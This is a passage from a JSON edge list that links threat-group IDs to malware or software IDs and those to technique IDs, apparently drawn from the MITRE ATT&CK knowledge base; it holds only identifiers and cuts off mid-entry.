            "source": "S0501",
            "target": "T1140"
        },
        {
            "source": "S0501",
            "target": "T1129"
        },
        {
            "source": "S0501",
            "target": "T1124"
        },
        {
            "source": "S0501",
            "target": "T1112"
        },
        {
            "source": "S0501",
            "target": "T1106"
        },
        {
            "source": "S0501",
            "target": "T1105"
        },
        {
            "source": "S0501",
            "target": "T1095"
        },
        {
            "source": "S0501",
            "target": "T1082"
        },
        {
            "source": "S0501",
            "target": "T1057"
        },
        {
            "source": "S0501",
            "target": "T1027"
        },
        {
            "source": "S0501",
            "target": "T1016"
        },
        {
            "source": "S0501",
            "target": "T1008"
        },
        {
            "source": "G0044",
            "target": "S0501"
        },
        {
            "source": "S0141",
            "target": "T1036.005"
        },
        {
            "source": "S0141",
            "target": "T1218.011"
        },
        {
            "source": "S0141",
            "target": "T1543.003"
        },
        {
            "source": "G0044",
            "target": "S0141"
        },
        {
            "source": "G0043",
            "target": "S0385"
        },
        {
            "source": "G0043",
            "target": "S0336"
        },
        {
            "source": "S0125",
            "target": "T1071.004"
        },
        {
            "source": "S0125",
            "target": "T1071.003"
        },
        {
            "source": "S0125",
            "target": "T1071.001"
        },
        {
            "source": "S0125",
            "target": "T1048.003"
        },
        {
            "source": "S0125",
            "target": "T1052.001"
        },
        {
            "source": "S0125",
            "target": "T1518.001"
        },
        {
            "source": "S0125",
            "target": "T1087.001"
        },
        {
            "source": "S0125",
            "target": "T1562.004"
        },
        {
            "source": "S0125",
            "target": "T1556.002"
        },
        {
            "source": "S0125",
            "target": "T1056.001"
        },
        {
            "source": "S0125",
            "target": "T1003.002"
        },
        {
            "source": "S0125",
            "target": "T1036.005"
        },
        {
            "source": "S0125",
            "target": "T1070.004"
        },
        {
            "source": "S0125",
            "target": "T1055.001"
        },
        {
            "source": "S0125",
            "target": "T1105"
        },
        {
            "source": "S0125",
            "target": "T1095"
        },
        {
            "source": "S0125",
            "target": "T1094"
        },
        {
            "source": "S0125",
            "target": "T1083"
        },
        {
            "source": "S0125",
            "target": "T1082"
        },
        {
            "source": "S0125",
            "target": "T1068"
        },
        {
            "source": "S0125",
            "target": "T1065"
        },
        {
            "source": "S0125",
            "target": "T1057"
        },
        {
            "source": "S0125",
            "target": "T1053"
        },
        {
            "source": "S0125",
            "target": "T1049"
        },
        {
            "source": "S0125",
            "target": "T1046"
        },
        {
            "source": "S0125",
            "target": "T1033"
        },
        {
            "source": "S0125",
            "target": "T1032"
        },
        {
            "source": "S0125",
            "target": "T1027"
        },
        {
            "source": "S0125",
            "target": "T1025"
        },
        {
            "source": "S0125",
            "target": "T1018"
        },
        {
            "source": "S0125",
            "target": "T1016"
        },
        {
            "source": "G0041",
            "target": "S0125"
        },
        {
            "source": "S0475",
            "target": "T1071.001"
        },
        {
            "source": "S0475",
            "target": "T1204.001"
        },
        {
            "source": "S0475",
            "target": "T1059.005"
        },
        {
            "source": "S0475",
            "target": "T1059.003"
        },
        {
            "source": "S0475",
            "target": "T1564.001"
        },
        {
            "source": "S0475",
            "target": "T1036.005"
        },
        {
            "source": "S0475",
            "target": "T1553.002"
        },
        {
            "source": "S0475",
            "target": "T1070.004"
        },
        {
            "source": "S0475",
            "target": "T1053.005"
        },
        {
            "source": "S0475",
            "target": "T1137.001"
        },
        {
            "source": "S0475",
            "target": "T1140"
        },
        {
            "source": "S0475",
            "target": "T1106"
        },
        {
            "source": "S0475",
            "target": "T1105"
        },
        {
            "source": "S0475",
            "target": "T1083"
        },
        {
            "source": "S0475",
            "target": "T1082"
        },
        {
            "source": "S0475",
            "target": "T1027"
        },
        {
            "source": "G0040",
            "target": "S0475"
        },
        {
            "source": "S0272",
            "target": "T1573.001"
        },
        {
            "source": "S0272",
            "target": "T1105"
        },
        {
            "source": "S0272",
            "target": "T1083"
        },
        {
            "source": "S0272",
            "target": "T1082"
        },
        {
            "source": "S0272",
            "target": "T1033"
        },
        {
            "source": "G0040",
            "target": "S0272"
        },
        {
            "source": "G0040",
            "target": "S0262"
        },
        {
            "source": "G0040",
            "target": "S0194"
        },
        {
            "source": "S0131",
            "target": "T1547.001"
        },
        {
            "source": "S0131",
            "target": "T1083"
        },
        {
            "source": "S0131",
            "target": "T1027"
        },
        {
            "source": "S0131",
            "target": "T1020"
        },
        {
            "source": "G0040",
            "target": "S0131"
        },
        {
            "source": "S0130",
            "target": "T1562.001"
        },
        {
            "source": "S0130",
            "target": "T1555.003"
        },
        {
            "source": "S0130",
            "target": "T1056.001"
        },
        {
            "source": "S0130",
            "target": "T1105"
        },
        {
            "source": "S0130",
            "target": "T1091"
        },
        {
            "source": "S0130",
            "target": "T1082"
        },
        {
            "source": "S0130",
            "target": "T1033"
        },
        {
            "source": "S0130",
            "target": "T1016"
        },
        {
            "source": "G0040",
            "target": "S0130"
        },
        {
            "source": "G0040",
            "target": "S0129"
        },
        {
            "source": "S0128",
            "target": "T1573.001"
        },
        {
            "source": "S0128",
            "target": "T1071.001"
        },
        {
            "source": "S0128",
            "target": "T1132.001"
        },
        {
            "source": "S0128",
            "target": "T1102.002"
        },
        {
            "source": "S0128",
            "target": "T1102.001"
        },
        {
            "source": "S0128",
            "target": "T1074.001"
        },
        {
            "source": "S0128",
            "target": "T1574.002"
        },
        {
            "source": "S0128",
            "target": "T1059.003"
        },
        {
            "source": "S0128",
            "target": "T1056.001"
        },
        {
            "source": "S0128",
            "target": "T1036.005"
        },
        {
            "source": "S0128",
            "target": "T1036.001"
        },
        {
            "source": "S0128",
            "target": "T1547.001"
        },
        {
            "source": "S0128",
            "target": "T1055.012"
        },
        {
            "source": "S0128",
            "target": "T1053.005"
        },
        {
            "source": "S0128",
            "target": "T1132"
        },
        {
            "source": "S0128",
            "target": "T1120"
        },
        {
            "source": "S0128",
            "target": "T1119"
        },
        {
            "source": "S0128",
            "target": "T1113"
        },
        {
            "source": "S0128",
            "target": "T1106"
        },
        {
            "source": "S0128",
            "target": "T1105"
        },
        {
            "source": "S0128",
            "target": "T1083"
        },
        {
            "source": "S0128",
            "target": "T1039"
        },
        {
            "source": "S0128",
            "target": "T1025"
        },
        {
            "source": "S0128",
            "target": "T1005"
        },
        {
            "source": "G0040",
            "target": "S0128"
        },
        {
            "source": "S0118",
            "target": "T1036.004"
        },
        {
            "source": "S0118",
            "target": "T1543.003"
        },
        {
            "source": "S0118",
            "target": "T1105"
        },
        {
            "source": "S0118",
            "target": "T1043"
        },
        {
            "source": "S0118",
            "target": "T1032"
        },
        {
            "source": "G0039",
            "target": "S0118"
        },
        {
            "source": "G0037",
            "target": "S0552"
        },
        {
            "source": "S0503",
            "target": "T1074.001"
        },
        {
            "source": "S0503",
            "target": "T1560.003"
        },
        {
            "source": "S0503",
            "target": "T1057"
        },
        {
            "source": "S0503",
            "target": "T1048"
        },
        {
            "source": "S0503",
            "target": "T1005"
        },
        {
            "source": "G0037",
            "target": "S0503"
        },
        {
            "source": "S0449",
            "target": "T1564.006"
        },
        {
            "source": "S0449",
            "target": "T1071.001"
        },
        {
            "source": "S0449",
            "target": "T1568"
        },
        {
            "source": "S0449",
            "target": "T1059.003"
        },
        {
            "source": "S0449",
            "target": "T1562.001"
        },
        {
            "source": "S0449",
            "target": "T1036.004"
        },
        {
            "source": "S0449",
            "target": "T1027.001"
        },
        {
            "source": "S0449",
            "target": "T1218.007"
        },
        {
            "source": "S0449",
            "target": "T1547.001"
        },
        {
            "source": "S0449",
            "target": "T1055.001"
        },
        {
            "source": "S0449",
            "target": "T1053.005"
        },
        {
            "source": "S0449",
            "target": "T1529"
        },
        {
            "source": "S0449",
            "target": "T1490"
        },
        {
            "source": "S0449",
            "target": "T1489"
        },
        {
            "source": "S0449",
            "target": "T1486"
        },
        {
            "source": "S0449",
            "target": "T1106"
        },
        {
            "source": "S0449",
            "target": "T1082"
        },
        {
            "source": "S0449",
            "target": "T1070"
        },
        {
            "source": "S0449",
            "target": "T1057"
        },
        {
            "source": "S0449",
            "target": "T1049"
        },
        {
            "source": "S0449",
            "target": "T1047"
        },
        {
            "source": "S0449",
            "target": "T1027"
        },
        {
            "source": "G0037",
            "target": "S0449"
        },
        {
            "source": "G0037",
            "target": "S0446"
        },
        {
            "source": "G0037",
            "target": "S0381"
        },
        {
            "source": "S0372",
            "target": "T1570"
        },
        {
            "source": "S0372",
            "target": "T1562.001"
        },
        {
            "source": "S0372",
            "target": "T1553.002"
        },
        {
            "source": "S0372",
            "target": "T1070.004"
        },
        {
            "source": "S0372",
            "target": "T1531"
        },
        {
            "source": "S0372",
            "target": "T1529"
        },
        {
            "source": "S0372",
            "target": "T1486"
        },
        {
            "source": "S0372",
            "target": "T0827"
        },
        {
            "source": "S0372",
            "target": "T0828"
        },
        {
            "source": "S0372",
            "target": "T0829"
        },
        {
            "source": "G0037",
            "target": "S0372"
        },
        {
            "source": "G0037",
            "target": "S0284"
        },
        {
            "source": "G0037",
            "target": "S0154"
        },
        {
            "source": "G0037",
            "target": "S0029"
        },
        {
            "source": "G0037",
            "target": "S0005"
        },
        {
            "source": "G0037",
            "target": "S0002"
        },
        {
            "source": "G0037",
            "target": "S0446"
        },
        {
            "source": "G0037",
            "target": "S0372"
        },
        {
            "source": "G0035",
            "target": "S0094"
        },
        {
            "source": "S0093",
            "target": "T1132.001"
        },
        {
            "source": "S0093",
            "target": "T1087.003"
        },
        {
            "source": "S0093",
            "target": "T1560"
        },
        {
            "source": "S0093",
            "target": "T1555.003"
        },
        {
            "source": "S0093",
            "target": "T1070.004"
        },
        {
            "source": "S0093",
            "target": "T1547.001"
        },
        {
            "source": "S0093",
            "target": "T1083"
        },
        {
            "source": "S0093",
            "target": "T1082"
        },
        {
            "source": "S0093",
            "target": "T1057"
        },
        {
            "source": "S0093",
            "target": "T1055"
        },
        {
            "source": "S0093",
            "target": "T1033"
        },
        {
            "source": "S0093",
            "target": "T1016"
        },
        {
            "source": "S0093",
            "target": "T0888"
        },
        {
            "source": "S0093",
            "target": "T0861"
        },
        {
            "source": "S0093",
            "target": "T0863"
        },
        {
            "source": "S0093",
            "target": "T0862"
        },
        {
            "source": "S0093",
            "target": "T0802"
        },
        {
            "source": "S0093",
            "target": "T0846"
        },
        {
            "source": "S0093",
            "target": "T0865"
        },
        {
            "source": "S0093",
            "target": "T0814"
        },
        {
            "source": "G0035",
            "target": "S0093"
        },
        {
            "source": "G0035",
            "target": "S0029"
        },
        {
            "source": "G0035",
            "target": "S0002"
        },
        {
            "source": "G0035",
            "target": "S0093"
        },
        {
            "source": "S0598",
            "target": "T1071.001"
        },
        {
            "source": "S0598",
            "target": "T1087.001"
        },
        {
            "source": "S0598",
            "target": "T1110.001"
        },
        {
            "source": "S0598",
            "target": "T1222.002"
        },
        {
            "source": "S0598",
            "target": "T1070.004"
        },
        {
            "source": "S0598",
            "target": "T1505.003"
        },
        {
            "source": "S0598",
            "target": "T1518"
        },
        {
            "source": "S0598",
            "target": "T1213"
        },
        {
            "source": "S0598",
            "target": "T1140"
        },
        {
            "source": "S0598",
            "target": "T1105"
        },
        {
            "source": "S0598",
            "target": "T1083"
        },
        {
            "source": "S0598",
            "target": "T1059"
        },
        {
            "source": "S0598",
            "target": "T1046"
        },
        {
            "source": "S0598",
            "target": "T1027"
        },
        {
            "source": "S0598",
            "target": "T1005"
        },
        {
            "source": "G0034",
            "target": "S0598"
        },
        {
            "source": "S0401",
            "target": "T1071.001"
        },
        {
            "source": "S0401",
            "target": "T1059.004"
        },
        {
            "source": "S0401",
            "target": "T1070.004"
        },
        {
            "source": "S0401",
            "target": "T1548.001"
        },
        {
            "source": "S0401",
            "target": "T1543.002"
        },
        {
            "source": "S0401",
            "target": "T1543"
        },
        {
            "source": "S0401",
            "target": "T1053.003"
        },
        {
            "source": "S0401",
            "target": "T1140"
        },
        {
            "source": "S0401",
            "target": "T1105"
        },
        {
            "source": "S0401",
            "target": "T1033"
        },
        {
            "source": "S0401",
            "target": "T1027"
        },
        {
            "source": "S0401",
            "target": "T1008"
        },
        {
            "source": "G0034",
            "target": "S0401"
        },
        {
            "source": "S0368",
            "target": "T1078.003"
        },
        {
            "source": "S0368",
            "target": "T1569.002"
        },
        {
            "source": "S0368",
            "target": "T1518.001"
        },
        {
            "source": "S0368",
            "target": "T1003.001"
        },
        {
            "source": "S0368",
            "target": "T1021.002"
        },
        {
            "source": "S0368",
            "target": "T1070.001"
        },
        {
            "source": "S0368",
            "target": "T1218.011"
        },
        {
            "source": "S0368",
            "target": "T1053.005"
        },
        {
            "source": "S0368",
            "target": "T1529"
        },
        {
            "source": "S0368",
            "target": "T1486"
        },
        {
            "source": "S0368",
            "target": "T1210"
        },
        {
            "source": "S0368",
            "target": "T1083"
        },
        {
            "source": "S0368",
            "target": "T1047"
        },
        {
            "source": "S0368",
            "target": "T1036"
        },
        {
            "source": "S0368",
            "target": "T0866"
        },
        {
            "source": "S0368",
            "target": "T0822"
        },
        {
            "source": "S0368",
            "target": "T0828"
        },
        {
            "source": "S0368",
            "target": "T0867"
        },
        {
            "source": "G0034",
            "target": "S0368"
        },
        {
            "source": "S0365",
            "target": "T1570"
        },
        {
            "source": "S0365",
            "target": "T1569.002"
        },
        {
            "source": "S0365",
            "target": "T1555.003"
        },
        {
            "source": "S0365",
            "target": "T1003.001"
        },
        {
            "source": "S0365",
            "target": "T1021.002"
        },
        {
            "source": "S0365",
            "target": "T1070.001"
        },
        {
            "source": "S0365",
            "target": "T1529"
        },
        {
            "source": "S0365",
            "target": "T1490"
        },
        {
            "source": "S0365",
            "target": "T1489"
        },
        {
            "source": "S0365",
            "target": "T1485"
        },
        {
            "source": "S0365",
            "target": "T1135"
        },
        {
            "source": "S0365",
            "target": "T1047"
        },
        {
            "source": "S0365",
            "target": "T1018"
        },
        {
            "source": "S0365",
            "target": "T1016"
        },
        {
            "source": "G0034",
            "target": "S0365"
        },
        {
            "source": "S0343",
            "target": "T1074.001"
        },
        {
            "source": "S0343",
            "target": "T1059.005"
        },
        {
            "source": "S0343",
            "target": "T1059.003"
        },
        {
            "source": "S0343",
            "target": "T1560"
        },
        {
            "source": "S0343",
            "target": "T1036.004"
        },
        {
            "source": "S0343",
            "target": "T1543.003"
        },
        {
            "source": "S0343",
            "target": "T1112"
        },
        {
            "source": "G0034",
            "target": "S0343"
        },
        {
            "source": "S0231",
            "target": "T1027"
        },
        {
            "source": "G0034",
            "target": "S0231"
        },
        {
            "source": "S0089",
            "target": "T1553.006"
        },
        {
            "source": "S0089",
            "target": "T1071.001"
        },
        {
            "source": "S0089",
            "target": "T1574.010"
        },
        {
            "source": "S0089",
            "target": "T1555.003"
        },
        {
            "source": "S0089",
            "target": "T1056.001"
        },
        {
            "source": "S0089",
            "target": "T1021.002"
        },
        {
            "source": "S0089",
            "target": "T1552.001"
        },
        {
            "source": "S0089",
            "target": "T1548.002"
        },
        {
            "source": "S0089",
            "target": "T1070.001"
        },
        {
            "source": "S0089",
            "target": "T1547.009"
        },
        {
            "source": "S0089",
            "target": "T1547.001"
        },
        {
            "source": "S0089",
            "target": "T1543.003"
        },
        {
            "source": "S0089",
            "target": "T1055.001"
        },
        {
            "source": "S0089",
            "target": "T1485"
        },
        {
            "source": "S0089",
            "target": "T1120"
        },
        {
            "source": "S0089",
            "target": "T1113"
        },
        {
            "source": "S0089",
            "target": "T1083"
        },
        {
            "source": "S0089",
            "target": "T1082"
        },
        {
            "source": "S0089",
            "target": "T1070"
        },
        {
            "source": "S0089",
            "target": "T1057"
        },
        {
            "source": "S0089",
            "target": "T1049"
        },
        {
            "source": "S0089",
            "target": "T1047"
        },
        {
            "source": "S0089",
            "target": "T1046"
        },
        {
            "source": "S0089",
            "target": "T1016"
        },
        {
            "source": "S0089",
            "target": "T1008"
        },
        {
            "source": "S0089",
            "target": "T0869"
        },
        {
            "source": "S0089",
            "target": "T0859"
        },
        {
            "source": "S0089",
            "target": "T0865"
        },
        {
            "source": "G0034",
            "target": "S0089"
        },
        {
            "source": "S0555",
            "target": "T1605"
        },
        {
            "source": "S0555",
            "target": "T1575"
        },
        {
            "source": "S0555",
            "target": "T1533"
        },
        {
            "source": "S0555",
            "target": "T1521"
        },
        {
            "source": "S0555",
            "target": "T1474"
        },
        {
            "source": "S0555",
            "target": "T1475"
        },
        {
            "source": "S0555",
            "target": "T1444"
        },
        {
            "source": "S0555",
            "target": "T1437"
        },
        {
            "source": "S0555",
            "target": "T1406"
        },
        {
            "source": "S0555",
            "target": "T1426"
        },
        {
            "source": "S0555",
            "target": "T1407"
        },
        {
            "source": "S0555",
            "target": "T1430"
        },
        {
            "source": "G0034",
            "target": "S0555"
        },
        {
            "source": "G0034",
            "target": "S0368"
        },
        {
            "source": "S1004",
            "target": "T0888"
        },
        {
            "source": "S1004",
            "target": "T0837"
        },
        {
            "source": "S1004",
            "target": "T0800"
        },
        {
            "source": "S1004",
            "target": "T0805"
        },
        {
            "source": "S1004",
            "target": "T0810"
        },
        {
            "source": "S1004",
            "target": "T0815"
        },
        {
            "source": "S1004",
            "target": "T0827"
        },
        {
            "source": "S1004",
            "target": "T0806"
        },
        {
            "source": "S1004",
            "target": "T0802"
        },
        {
            "source": "S1004",
            "target": "T0831"
        },
        {
            "source": "S1004",
            "target": "T0840"
        },
        {
            "source": "S1004",
            "target": "T0881"
        },
        {
            "source": "S1004",
            "target": "T0803"
        },
        {
            "source": "S1004",
            "target": "T0813"
        },
        {
            "source": "S1004",
            "target": "T0816"
        },
        {
            "source": "S1004",
            "target": "T0880"
        },
        {
            "source": "S1004",
            "target": "T0832"
        },
        {
            "source": "S1004",
            "target": "T0846"
        },
        {
            "source": "S1004",
            "target": "T0804"
        },
        {
            "source": "S1004",
            "target": "T0807"
        },
        {
            "source": "S1004",
            "target": "T0809"
        },
        {
            "source": "S1004",
            "target": "T0814"
        },
        {
            "source": "S1004",
            "target": "T0829"
        },
        {
            "source": "S1004",
            "target": "T0849"
        },
        {
            "source": "S1004",
            "target": "T0855"
        },
        {
            "source": "G0034",
            "target": "S1004"
        },
        {
            "source": "S1005",
            "target": "T0872"
        },
        {
            "source": "S1005",
            "target": "T0881"
        },
        {
            "source": "S1005",
            "target": "T0809"
        },
        {
            "source": "S1005",
            "target": "T0829"
        },
        {
            "source": "G0034",
            "target": "S1005"
        },
        {
            "source": "G0034",
            "target": "S0089"
        },
        {
            "source": "S0593",
            "target": "T1074.001"
        },
        {
            "source": "S0593",
            "target": "T1059.003"
        },
        {
            "source": "S0593",
            "target": "T1056.001"
        },
        {
            "source": "S0593",
            "target": "T1070.004"
        },
        {
            "source": "S0593",
            "target": "T1113"
        },
        {
            "source": "S0593",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0593"
        },
        {
            "source": "S0586",
            "target": "T1573.001"
        },
        {
            "source": "S0586",
            "target": "T1001.003"
        },
        {
            "source": "S0586",
            "target": "T1059.003"
        },
        {
            "source": "S0586",
            "target": "T1560"
        },
        {
            "source": "S0586",
            "target": "T1036.005"
        },
        {
            "source": "S0586",
            "target": "T1027.001"
        },
        {
            "source": "S0586",
            "target": "T1070.006"
        },
        {
            "source": "S0586",
            "target": "T1070.004"
        },
        {
            "source": "S0586",
            "target": "T1547.001"
        },
        {
            "source": "S0586",
            "target": "T1124"
        },
        {
            "source": "S0586",
            "target": "T1105"
        },
        {
            "source": "S0586",
            "target": "T1083"
        },
        {
            "source": "S0586",
            "target": "T1082"
        },
        {
            "source": "S0586",
            "target": "T1057"
        },
        {
            "source": "S0586",
            "target": "T1018"
        },
        {
            "source": "S0586",
            "target": "T1008"
        },
        {
            "source": "G0032",
            "target": "S0586"
        },
        {
            "source": "S0584",
            "target": "T1071.001"
        },
        {
            "source": "S0584",
            "target": "T1204.002"
        },
        {
            "source": "S0584",
            "target": "T1204.001"
        },
        {
            "source": "S0584",
            "target": "T1569.001"
        },
        {
            "source": "S0584",
            "target": "T1059.004"
        },
        {
            "source": "S0584",
            "target": "T1497.003"
        },
        {
            "source": "S0584",
            "target": "T1566.002"
        },
        {
            "source": "S0584",
            "target": "T1564.001"
        },
        {
            "source": "S0584",
            "target": "T1553.002"
        },
        {
            "source": "S0584",
            "target": "T1070.004"
        },
        {
            "source": "S0584",
            "target": "T1548.002"
        },
        {
            "source": "S0584",
            "target": "T1218.007"
        },
        {
            "source": "S0584",
            "target": "T1543.004"
        },
        {
            "source": "S0584",
            "target": "T1543.003"
        },
        {
            "source": "S0584",
            "target": "T1053.005"
        },
        {
            "source": "S0584",
            "target": "T1140"
        },
        {
            "source": "S0584",
            "target": "T1082"
        },
        {
            "source": "S0584",
            "target": "T1041"
        },
        {
            "source": "S0584",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0584"
        },
        {
            "source": "S0567",
            "target": "T1074.001"
        },
        {
            "source": "S0567",
            "target": "T1574"
        },
        {
            "source": "S0567",
            "target": "T1059.003"
        },
        {
            "source": "S0567",
            "target": "T1560"
        },
        {
            "source": "S0567",
            "target": "T1056.001"
        },
        {
            "source": "S0567",
            "target": "T1036.005"
        },
        {
            "source": "S0567",
            "target": "T1070.004"
        },
        {
            "source": "S0567",
            "target": "T1547"
        },
        {
            "source": "S0567",
            "target": "T1543.003"
        },
        {
            "source": "S0567",
            "target": "T1055.012"
        },
        {
            "source": "S0567",
            "target": "T1217"
        },
        {
            "source": "S0567",
            "target": "T1140"
        },
        {
            "source": "S0567",
            "target": "T1129"
        },
        {
            "source": "S0567",
            "target": "T1105"
        },
        {
            "source": "S0567",
            "target": "T1083"
        },
        {
            "source": "S0567",
            "target": "T1082"
        },
        {
            "source": "S0567",
            "target": "T1078"
        },
        {
            "source": "S0567",
            "target": "T1057"
        },
        {
            "source": "S0567",
            "target": "T1049"
        },
        {
            "source": "S0567",
            "target": "T1027"
        },
        {
            "source": "S0567",
            "target": "T1016"
        },
        {
            "source": "S0567",
            "target": "T1012"
        },
        {
            "source": "S0567",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0567"
        },
        {
            "source": "S0520",
            "target": "T1573.001"
        },
        {
            "source": "S0520",
            "target": "T1071.001"
        },
        {
            "source": "S0520",
            "target": "T1132.001"
        },
        {
            "source": "S0520",
            "target": "T1204.002"
        },
        {
            "source": "S0520",
            "target": "T1059.003"
        },
        {
            "source": "S0520",
            "target": "T1566.001"
        },
        {
            "source": "S0520",
            "target": "T1036.005"
        },
        {
            "source": "S0520",
            "target": "T1553.002"
        },
        {
            "source": "S0520",
            "target": "T1027.002"
        },
        {
            "source": "S0520",
            "target": "T1070.006"
        },
        {
            "source": "S0520",
            "target": "T1070.004"
        },
        {
            "source": "S0520",
            "target": "T1218.011"
        },
        {
            "source": "S0520",
            "target": "T1140"
        },
        {
            "source": "S0520",
            "target": "T1129"
        },
        {
            "source": "S0520",
            "target": "T1105"
        },
        {
            "source": "S0520",
            "target": "T1083"
        },
        {
            "source": "S0520",
            "target": "T1082"
        },
        {
            "source": "S0520",
            "target": "T1041"
        },
        {
            "source": "S0520",
            "target": "T1027"
        },
        {
            "source": "S0520",
            "target": "T1016"
        },
        {
            "source": "S0520",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0520"
        },
        {
            "source": "S0498",
            "target": "T1573"
        },
        {
            "source": "S0498",
            "target": "T1070.004"
        },
        {
            "source": "S0498",
            "target": "T1105"
        },
        {
            "source": "S0498",
            "target": "T1095"
        },
        {
            "source": "S0498",
            "target": "T1083"
        },
        {
            "source": "S0498",
            "target": "T1033"
        },
        {
            "source": "S0498",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0498"
        },
        {
            "source": "S0497",
            "target": "T1071.001"
        },
        {
            "source": "S0497",
            "target": "T1564.001"
        },
        {
            "source": "S0497",
            "target": "T1543.004"
        },
        {
            "source": "S0497",
            "target": "T1543.001"
        },
        {
            "source": "S0497",
            "target": "T1105"
        },
        {
            "source": "S0497",
            "target": "T1083"
        },
        {
            "source": "S0497",
            "target": "T1057"
        },
        {
            "source": "S0497",
            "target": "T1036"
        },
        {
            "source": "S0497",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0497"
        },
        {
            "source": "S0431",
            "target": "T1573.001"
        },
        {
            "source": "S0431",
            "target": "T1564.003"
        },
        {
            "source": "S0431",
            "target": "T1059.003"
        },
        {
            "source": "S0431",
            "target": "T1027.002"
        },
        {
            "source": "S0431",
            "target": "T1070.004"
        },
        {
            "source": "S0431",
            "target": "T1053.005"
        },
        {
            "source": "S0431",
            "target": "T1518"
        },
        {
            "source": "S0431",
            "target": "T1489"
        },
        {
            "source": "S0431",
            "target": "T1113"
        },
        {
            "source": "S0431",
            "target": "T1106"
        },
        {
            "source": "S0431",
            "target": "T1105"
        },
        {
            "source": "S0431",
            "target": "T1083"
        },
        {
            "source": "S0431",
            "target": "T1082"
        },
        {
            "source": "S0431",
            "target": "T1057"
        },
        {
            "source": "S0431",
            "target": "T1041"
        },
        {
            "source": "S0431",
            "target": "T1033"
        },
        {
            "source": "S0431",
            "target": "T1027"
        },
        {
            "source": "S0431",
            "target": "T1016"
        },
        {
            "source": "S0431",
            "target": "T1010"
        },
        {
            "source": "S0431",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0431"
        },
        {
            "source": "S0376",
            "target": "T1132.001"
        },
        {
            "source": "S0376",
            "target": "T1571"
        },
        {
            "source": "S0376",
            "target": "T1569.002"
        },
        {
            "source": "S0376",
            "target": "T1059.003"
        },
        {
            "source": "S0376",
            "target": "T1562.004"
        },
        {
            "source": "S0376",
            "target": "T1003.002"
        },
        {
            "source": "S0376",
            "target": "T1550.002"
        },
        {
            "source": "S0376",
            "target": "T1124"
        },
        {
            "source": "S0376",
            "target": "T1112"
        },
        {
            "source": "S0376",
            "target": "T1105"
        },
        {
            "source": "S0376",
            "target": "T1090"
        },
        {
            "source": "S0376",
            "target": "T1083"
        },
        {
            "source": "S0376",
            "target": "T1082"
        },
        {
            "source": "S0376",
            "target": "T1065"
        },
        {
            "source": "S0376",
            "target": "T1055"
        },
        {
            "source": "S0376",
            "target": "T1047"
        },
        {
            "source": "S0376",
            "target": "T1043"
        },
        {
            "source": "S0376",
            "target": "T1041"
        },
        {
            "source": "S0376",
            "target": "T1012"
        },
        {
            "source": "S0376",
            "target": "T1008"
        },
        {
            "source": "G0032",
            "target": "S0376"
        },
        {
            "source": "S0366",
            "target": "T1573.002"
        },
        {
            "source": "S0366",
            "target": "T1090.003"
        },
        {
            "source": "S0366",
            "target": "T1570"
        },
        {
            "source": "S0366",
            "target": "T1564.001"
        },
        {
            "source": "S0366",
            "target": "T1563.002"
        },
        {
            "source": "S0366",
            "target": "T1222.001"
        },
        {
            "source": "S0366",
            "target": "T1543.003"
        },
        {
            "source": "S0366",
            "target": "T1490"
        },
        {
            "source": "S0366",
            "target": "T1489"
        },
        {
            "source": "S0366",
            "target": "T1486"
        },
        {
            "source": "S0366",
            "target": "T1210"
        },
        {
            "source": "S0366",
            "target": "T1120"
        },
        {
            "source": "S0366",
            "target": "T1083"
        },
        {
            "source": "S0366",
            "target": "T1047"
        },
        {
            "source": "S0366",
            "target": "T1018"
        },
        {
            "source": "S0366",
            "target": "T1016"
        },
        {
            "source": "S0366",
            "target": "T0866"
        },
        {
            "source": "S0366",
            "target": "T0822"
        },
        {
            "source": "S0366",
            "target": "T0867"
        },
        {
            "source": "G0032",
            "target": "S0366"
        },
        {
            "source": "S0364",
            "target": "T1561.002"
        },
        {
            "source": "S0364",
            "target": "T1561.001"
        },
        {
            "source": "S0364",
            "target": "T1485"
        },
        {
            "source": "G0032",
            "target": "S0364"
        },
        {
            "source": "S0347",
            "target": "T1059.003"
        },
        {
            "source": "S0347",
            "target": "T1070.004"
        },
        {
            "source": "S0347",
            "target": "T1543.003"
        },
        {
            "source": "S0347",
            "target": "T1140"
        },
        {
            "source": "S0347",
            "target": "T1105"
        },
        {
            "source": "S0347",
            "target": "T1090"
        },
        {
            "source": "S0347",
            "target": "T1083"
        },
        {
            "source": "S0347",
            "target": "T1055"
        },
        {
            "source": "S0347",
            "target": "T1043"
        },
        {
            "source": "S0347",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0347"
        },
        {
            "source": "S0245",
            "target": "T1573.001"
        },
        {
            "source": "S0245",
            "target": "T1001.003"
        },
        {
            "source": "S0245",
            "target": "T1571"
        },
        {
            "source": "S0245",
            "target": "T1562.004"
        },
        {
            "source": "S0245",
            "target": "T1112"
        },
        {
            "source": "S0245",
            "target": "T1090"
        },
        {
            "source": "S0245",
            "target": "T1082"
        },
        {
            "source": "S0245",
            "target": "T1043"
        },
        {
            "source": "S0245",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0245"
        },
        {
            "source": "S0246",
            "target": "T1001.003"
        },
        {
            "source": "S0246",
            "target": "T1571"
        },
        {
            "source": "S0246",
            "target": "T1059.003"
        },
        {
            "source": "S0246",
            "target": "T1562.004"
        },
        {
            "source": "S0246",
            "target": "T1090"
        },
        {
            "source": "S0246",
            "target": "T1043"
        },
        {
            "source": "G0032",
            "target": "S0246"
        },
        {
            "source": "S0241",
            "target": "T1071.001"
        },
        {
            "source": "S0241",
            "target": "T1059.003"
        },
        {
            "source": "S0241",
            "target": "T1059.001"
        },
        {
            "source": "S0241",
            "target": "T1087.001"
        },
        {
            "source": "S0241",
            "target": "T1055.001"
        },
        {
            "source": "S0241",
            "target": "T1105"
        },
        {
            "source": "S0241",
            "target": "T1082"
        },
        {
            "source": "S0241",
            "target": "T1057"
        },
        {
            "source": "S0241",
            "target": "T1049"
        },
        {
            "source": "S0241",
            "target": "T1047"
        },
        {
            "source": "S0241",
            "target": "T1043"
        },
        {
            "source": "S0241",
            "target": "T1033"
        },
        {
            "source": "S0241",
            "target": "T1018"
        },
        {
            "source": "S0241",
            "target": "T1016"
        },
        {
            "source": "S0241",
            "target": "T1012"
